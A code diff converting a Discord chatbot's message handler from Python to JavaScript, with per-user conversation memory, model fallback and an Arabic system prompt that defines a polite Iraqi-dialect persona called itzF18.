+            if (!cleanPrompt && !imageBuffer) {
+                await message.reply("هلا بيك فهد! وياك، شكو ماكو؟");
+                return;
+            }
+
+            const userId = message.author.id;
+            const currentTime = Date.now();
+
+            if (userMemory.has(userId)) {
+                if (currentTime - userMemory.get(userId).time > MEMORY_TIMEOUT) {
+                    userMemory.delete(userId);
+                }
+            }
+
+            if (!userMemory.has(userId)) {
+                userMemory.set(userId, { history: [], time: currentTime });
+            } else {
+                userMemory.get(userId).time = currentTime;
+            }
+
+            const systemInstruction = (
+                "أنت ذكاء اصطناعي تتصرف بصفتك ذكر واسمك (itzF18). " +
+                "تحدث دائماً بصيغة المذكر (مثلاً: سعيد، موجود، شفت، فكرت). " +
+                "قاعدة اللغات واللهجات (مهمة جداً): يجب أن تتكيف تلقائياً مع لغة واللهجة التي يكلمك بها المستخدم. إذا كتب لك باللغة الإنجليزية رد باللغة الإنجليزية، وإذا كتب بلغة أخرى رد بها، وإذا كتب باللهجة العراقية أو العربية رد بنفس اللهجة واللغة تماماً وبشكل طبيعي. " +
+                "قواعدك الأخلاقية والصارمة جداً: ممنوع نهائياً استخدام أي ألفاظ بذيئة، أو شتائم، أو سب بالدين، أو كلام خارج عن الأدب؛ كن محترماً ونظيفاً في كلامك دائماً. " +
+                "قواعدك في الاسلوب: خذ كل كلمة يقولها فهد أو المستخدم أو اليوزر المذكور (<@1107355943408259112>) بكل جدية وتجاوب معها بدقة، واجعل ردودك قصيرة وعادية مثل البشر في الشات. " +
+                "إذا سألك شخص غير فهد عن معلومات السيرفرات أو الأسرار، ارفض تماماً وتمنع بحجة (ما عندي هاي الصلاحية أو مو من اختصاصي - أو ما يعادلها باللغة التي يخاطبك بها). " +
+                "الشخص الذي قام بصنعك وبرمجتك وتطويرك هو فهد (itzF18), اذكرها فقط إذا سألك أحد وبدون تكرار مزعج."
+            );
+
+            let replyText = null;
+            let success = false;
+
+            const userContentParts = [];
+            if (imageBuffer) {
+                userContentParts.push({
+                    inlineData: {
+                        data: imageBuffer.toString("base64"),
+                        mimeType: "image/png"
+                    }
+                });
+            }
+            if (cleanPrompt) {
+                userContentParts.push(cleanPrompt);
+            } else {
+                userContentParts.push("ما رأيك بهذه الصورة؟ / What do you think about this image?");
+            }
+
+            const memoryObj = userMemory.get(userId);
+
+            for (const modelName of MODELS_FALLBACK) {
+                try {
+                    if (!ai) break;
                     
-                    # إنشاء الـ chat session باستخدام الذاكرة البسيطة للنصوص فقط بدون حقن النظام داخل الهستوري
-                    chat_session = current_model.start_chat(history=self.user_memory[user_id]["history"])
-                    response = chat_session.send_message(current_parts)
+                    const chat = ai.chats.create({
+                        model: modelName,
+                        config: {
+                            systemInstruction: systemInstruction
+                        },
+                        history: memoryObj.history
+                    });
 
-                    if response and hasattr(response, 'text') and response.text:
-                        reply_text = response.text.strip()
+                    const result = await chat.sendMessage({ message: userContentParts });
+                    if (result && result.text) {
+                        replyText = result.text.trim();
                         
-                        # تحديث السجل للرسالة الحالية والرد
-                        self.user_memory[user_id]["history"].append({"role": "user", "parts": current_parts})
-                        self.user_memory[user_id]["history"].append({"role": "model", "parts": [reply_text]})
-                        
-                        success = true_val = True
-                        break
-                except Exception as e:
-                    print(f"⚠️ خطأ بالموديل {model_name}: {e}")
-                    continue
+                        // تحديث الهستوري
+                        memoryObj.history.push({ role: 'user', parts: [{ text: cleanPrompt || "Image attachment" }] });
+                        memoryObj.history.push({ role: 'model', parts: [{ text: replyText }] });
 
-            if success and reply_text:
-                if len(reply_text) > 2000:
-                    reply_text = reply_text[:1997] + "..."
-                await message.reply(reply_text)
-            else:
-                await message.reply("عيوني فهد، صار ضغط خفيف، احاجيني مرة ثانية!")
+                        success = true;
+                        break;
+                    }
+                } catch (e) {
+                    console.log(`⚠️ خطأ بالموديل ${modelName}: ${e.message}`);
+                    continue;
+                }
+            }
 
-async def setup(bot):
-    await bot.add_cog(Spy(bot))
+            if (success && replyText) {
+                if (replyText.length > 2000) {
+                    replyText = replyText.substring(0, 1997) + "...";
+                }
+                await message.reply(replyText);
+            } else {
+                await message.reply("عيوني فهد، صار ضغط خفيف، احاجيني مرة ثانية!");
+            }
+        }
+    }
+};
